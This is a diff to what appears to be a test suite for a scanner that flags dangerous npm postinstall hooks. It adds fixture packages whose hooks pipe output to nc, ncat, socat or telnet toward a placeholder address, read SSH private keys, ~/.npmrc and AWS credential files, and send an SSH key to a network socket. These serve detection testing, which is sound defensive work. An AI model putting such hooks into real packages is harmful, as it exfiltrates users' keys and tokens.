@@ -104,6 +104,25 @@ CASES = {
     "trailing_semicolon": pkg({"postinstall": "npm run fetchbin;", "fetchbin": EVIL}),
     "run_script_dashdash": pkg({"postinstall": "npm run-script fetchbin -- --x", "fetchbin": EVIL}),
     "glob_runp": pkg({"postinstall": 'run-p "fetch*"', "fetchbin": EVIL}),
+    # install hook pipes to a raw socket client or reads a credential file, next to a
+    # quiet redirect that is not a danger token on its own (#377 review)
+    "netcat_after_quiet_redirect": pkg({"postinstall": "node x.js 2>/dev/null | nc 192.0.2.1 80"},
+                                       {"x.js": "console.log(1);\n"}),
+    "ncat_after_quiet_redirect": pkg({"postinstall": "node x.js 2>/dev/null | ncat 192.0.2.1 80"},
+                                     {"x.js": "console.log(1);\n"}),
+    "socat_after_quiet_redirect": pkg({"postinstall": "node x.js 2>/dev/null | socat - TCP:192.0.2.1:80"},
+                                      {"x.js": "console.log(1);\n"}),
+    "telnet_after_quiet_redirect": pkg({"postinstall": "node x.js 2>/dev/null | telnet 192.0.2.1 80"},
+                                       {"x.js": "console.log(1);\n"}),
+    "ssh_key_read_tilde": pkg({"postinstall": "node x.js < ~/.ssh/id_rsa > /dev/null"},
+                              {"x.js": "console.log(1);\n"}),
+    "ssh_key_read_home_var": pkg({"postinstall": "node x.js < $HOME/.ssh/id_ed25519 >/dev/null"},
+                                 {"x.js": "console.log(1);\n"}),
+    "npmrc_read": pkg({"postinstall": "node x.js < ~/.npmrc > /dev/null"},
+                      {"x.js": "console.log(1);\n"}),
+    "aws_credentials_read": pkg({"postinstall": "node x.js < ~/.aws/credentials > /dev/null"},
+                                {"x.js": "console.log(1);\n"}),
+    "ssh_key_to_stdout_piped_to_nc": pkg({"postinstall": "cat ~/.ssh/id_rsa > /dev/stdout | nc 192.0.2.1 80"}),
     # allowlist: config values iterated without naming the key
     "allowlist_values_iter": pkg({"build": "vite build"}, {
         "config.json": json.dumps({"server": {"allowedHosts": ["abc.ngrok-free.app"]}}),
